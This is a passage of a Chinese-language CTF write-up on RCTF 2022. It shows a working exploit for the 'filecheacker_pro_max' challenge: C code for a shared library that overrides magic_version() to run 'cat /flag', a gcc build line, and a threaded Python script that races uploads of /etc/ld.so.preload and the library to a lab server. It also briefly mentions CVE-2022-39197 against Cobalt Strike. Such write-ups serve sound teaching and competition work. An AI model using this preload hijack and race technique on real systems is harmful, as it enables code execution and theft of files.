<p><strong>LD_PRELOAD</strong></p>
<p>要在所有其他库之前加载的其他用户指定的 ELF 共享库的列表。列表中的项目可以用空格或冒号分隔。这可用于有选择地覆盖其他共享库中的函数。使用“说明”下给出的规则搜索库。对于 set-user-ID&#x2F;set-group-ID ELF 二进制文件，将忽略包含斜杠的预加载路径名，并且仅当在库文件上启用了 set-user-ID 权限位时，才会加载标准搜索目录中的库。</p>
</blockquote>
<p>相反，文件 &#x2F;etc&#x2F;<em>ld.so.preload</em> 没有这样的限制，其想法是，如果你<code>可以读/写目录 /etc</code>，你就已经有了 root 凭据。因此它的使用。</p>
<p>请记住<em>，即使一开始</em>您似乎没有 <code>/etc/ld.so.preload</code>，您也可以使用 <code>/etc/ld.so.preload</code>：它只不过是 <em><code>glibc</code></em> 的一个功能，因此是所有 Linux 发行版（但据我所知，不是 Unix 风格），因此您可以创建它并将任何 Linux 发行版中<strong>任何</strong> setuid 库的名称放入其中， 它会起作用。</p>
</blockquote>
<p>也就是说它是一个加载库的配置文件，相当于命令的所需库的配置，当命令执行时其中的二进制配置文件也会被认为是该命令执行的一个部分进行加载执行</p>
<blockquote>
<p>所以我们需要上传两个文件，一个是能够执行<code>cat /flag</code>的二进制文件，一个是<code>/etc/ld.so.preload</code>文件，而且<code>/etc/ld.so.preload</code>中需要包含改二进制文件路径，以实现加载的目的</p>
</blockquote>
<blockquote>
<p>*所谓的库，实际上就是<code>/bin/file</code>命令执行过程中用到的函数的定义库，而上传的二进制文件的主要目的就是劫持<code>/bin/file</code>命令中的利用的函数，进行重新定义</p>
</blockquote>
<p>在<a target="_blank" rel="noopener" href="https://github.com/file/file/blob/30ad4181ef4f2f09d36aee1163386b8d2904d0e0/src/magic.h.in">file&#x2F;magic.h.in at 30ad4181ef4f2f09d36aee1163386b8d2904d0e0 · file&#x2F;file (github.com)</a>中查看file利用的函数，发现<code>magic_version()</code>很合适，因为它不需要参数</p>
<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230315210955814.png"><img src="/2022RCTF/image-20230315210955814.png" alt="image-20230315210955814"></a></p>
<h3 id="构造利用文件"><a href="#构造利用文件" class="headerlink" title="构造利用文件"></a>构造利用文件</h3><p>于是构造二进制文件</p>
<p><code>haha.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">magic_version</span><span class="params">()</span> &#123;</span><br><span class="line">  system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc haha.c -o haha.so -fPIC -shared -ldl -D_GNU_SOURCE</span><br><span class="line"><span class="comment">#-fPIC: 指定生成位置无关代码（Position-Independent Code, PIC），这是必要的，因为共享库可以在内存中的任意位置加载，所以需要确保代码中的地址引用是相对的而不是绝对的。</span></span><br><span class="line"><span class="comment">#-shared: 指定生成共享库，这意味着代码将被编译成一个动态链接库（也称为共享对象），而不是可执行文件。</span></span><br><span class="line"><span class="comment">#-ldl: 链接动态加载器库（Dynamic Loading Library, dl），这个库提供了动态加载和链接共享库的接口，程序可以使用它来在运行时加载和链接共享库。</span></span><br><span class="line"><span class="comment">#-D_GNU_SOURCE: 定义一个宏，它告诉编译器使用 GNU 标准库的特定功能，这些功能不是 C 标准的一部分。</span></span><br></pre></td></tr></table></figure>

<p>得到<code>haha.so</code>，我们可以将其传到&#x2F;tmp下，避免在upload目录下被</p>
<p>于是可以构造<code>/etc/ld.so.preload</code>内容</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/tmp/</span>haha.so</span><br></pre></td></tr></table></figure>

<p>这样它就会加载<code>/tmp/haha.so</code></p>
<hr>
<p>但是上传完一个文件后，执行完<code>/bin/file</code>，会执行</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.remove(filepath)</span><br></pre></td></tr></table></figure>

<p>删除该文件，所以想要在实现上面操作，就必须在&#x2F;bin&#x2F;file执行前将两个文件上传上去，才能实现劫持该命令实现<code>cat /flag</code>，所以这里需要进行条件竞争</p>
<p>写个简单py进行竞争，或者用bp放包</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.80.138:3000/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload1</span>():</span><br><span class="line">    file = &#123;<span class="string">&quot;file-upload&quot;</span>: (<span class="string">&quot;/etc/ld.so.preload&quot;</span>, <span class="built_in">open</span>(<span class="string">&quot;./ld.so.preload&quot;</span>, <span class="string">&quot;r&quot;</span>))&#125;</span><br><span class="line">    res = requests.post(url, files=file)</span><br><span class="line">    <span class="built_in">print</span>(re.findall(<span class="string">&quot;&lt;h3&gt;(.*)&lt;/h3&gt;&quot;</span>, res.text, re.S)[<span class="number">0</span>])</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload2</span>():</span><br><span class="line">    file = &#123;<span class="string">&quot;file-upload&quot;</span>: (<span class="string">&quot;/tmp/haha.so&quot;</span>, <span class="built_in">open</span>(<span class="string">&quot;./haha.so&quot;</span>, <span class="string">&quot;rb&quot;</span>))&#125;</span><br><span class="line">    res = requests.post(url, files=file)</span><br><span class="line">    <span class="built_in">print</span>(re.findall(<span class="string">&quot;&lt;h3&gt;(.*)&lt;/h3&gt;&quot;</span>, res.text, re.S)[<span class="number">0</span>])</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        threading.Thread(target=upload1).start()</span><br><span class="line">        threading.Thread(target=upload2).start()</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/2022RCTF/image-20230315222627587.png"><img src="/2022RCTF/image-20230315222627587.png" alt="image-20230315222627587"></a></p>
<p>得到flag</p>
<h2 id="C3"><a href="#C3" class="headerlink" title="C3"></a>C3</h2><p>一道0解的题目，最后提示了端口，看到就想到<code>Cobaltstrike</code>但是不知道怎么利用，于是准备复现<code>CVE-2022-39197</code>，当作题目复现了，内容写在在<code>CVE漏洞学习</code></p>
<blockquote>
<p>hint：</p>
<p>Command and Control.</p>
<p>该题无需爆破；</p>
<p>port 50050</p>
</blockquote>
<p>这是一道<code>CVE-2022-39197</code>【<code>Cobaltstrike RCE</code>】真实环境中的漏洞利用</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">首页</a></li>
        
          <li><a href="/archives/">文章</a></li>
        
          <li><a href="/categories/">分类</a></li>
        
          <li><a href="/tags/">标签</a></li>
        
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RCTF2022"><span class="toc-number">1.</span> <span class="toc-text">RCTF2022</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easyupload"><span class="toc-number">1.1.</span> <span class="toc-text">easyupload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.1.1.</span> <span class="toc-text">知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#libmbfl%E6%89%93%E5%88%86"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">libmbfl打分</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%BC%E4%B8%8A"><span class="toc-number">1.1.2.</span> <span class="toc-text">综上</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezruoyi"><span class="toc-number">1.2.</span> <span class="toc-text">ezruoyi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PrettierOnline"><span class="toc-number">1.3.</span> <span class="toc-text">PrettierOnline</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#index-js"><span class="toc-number">1.3.1.</span> <span class="toc-text">index.js</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fw-js"><span class="toc-number">1.3.2.</span> <span class="toc-text">fw.js</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#js-payload"><span class="toc-number">1.3.3.</span> <span class="toc-text">js payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezbypass"><span class="toc-number">1.4.</span> <span class="toc-text">ezbypass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#password%E5%8F%82%E6%95%B0"><span class="toc-number">1.4.1.</span> <span class="toc-text">password参数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Ognl-%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%BC%95%E7%94%A8%E8%BF%87%E6%BB%A4"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">Ognl 注入绕过引用过滤</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poc%E5%8F%82%E6%95%B0"><span class="toc-number">1.4.2.</span> <span class="toc-text">poc参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#type%E5%8F%82%E6%95%B0"><span class="toc-number">1.4.3.</span> <span class="toc-text">type参数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#yourclasses%E5%8F%82%E6%95%B0"><span class="toc-number">1.4.4.</span> <span class="toc-text">yourclasses参数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#classes-0-classes-1"><span class="toc-number">1.4.4.1.</span> <span class="toc-text">classes[0]&amp;classes[1]</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#classes-2-classes-3"><span class="toc-number">1.4.4.2.</span> <span class="toc-text">classes[2]&amp;classes[3]</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-number">1.4.5.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#filecheacker-mini"><span class="toc-number">1.5.</span> <span class="toc-text">filecheacker_mini</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#file-b%E8%A7%A3%E6%9E%90-%E5%90%8E%E5%86%85%E5%AE%B9%E6%98%BE%E7%A4%BA"><span class="toc-number">1.5.1.</span> <span class="toc-text">file -b解析#!后内容显示</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#filecheacker-pro"><span class="toc-number">1.6.</span> <span class="toc-text">filecheacker_pro</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#filecheacker-pro-max"><span class="toc-number">1.7.</span> <span class="toc-text">filecheacker_pro_max</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.7.1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6"><span class="toc-number">1.7.2.</span> <span class="toc-text">构造利用文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C3"><span class="toc-number">1.8.</span> <span class="toc-text">C3</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ttoc.fun/2022RCTF/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ttoc.fun/2022RCTF/&text=2022RCTF"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ttoc.fun/2022RCTF/&title=2022RCTF"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ttoc.fun/2022RCTF/&is_video=false&description=2022RCTF"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=2022RCTF&body=Check out this article: https://ttoc.fun/2022RCTF/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ttoc.fun/2022RCTF/&title=2022RCTF"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ttoc.fun/2022RCTF/&title=2022RCTF"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ttoc.fun/2022RCTF/&title=2022RCTF"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ttoc.fun/2022RCTF/&title=2022RCTF"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ttoc.fun/2022RCTF/&name=2022RCTF&description=&lt;p&gt;&lt;code&gt;学到很多&lt;/code&gt;&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ttoc.fun/2022RCTF/&t=2022RCTF"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2022-2024
    Ttoc
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/archives/">文章</a></li><!--
     --><!--
       --><li><a href="/categories/">分类</a></li><!--
     --><!--
       --><li><a href="/tags/">标签</a></li><!--
     --><!--
       --><li><a href="/search/">搜索</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->


<!-- FancyBox -->

  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>
  

<script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>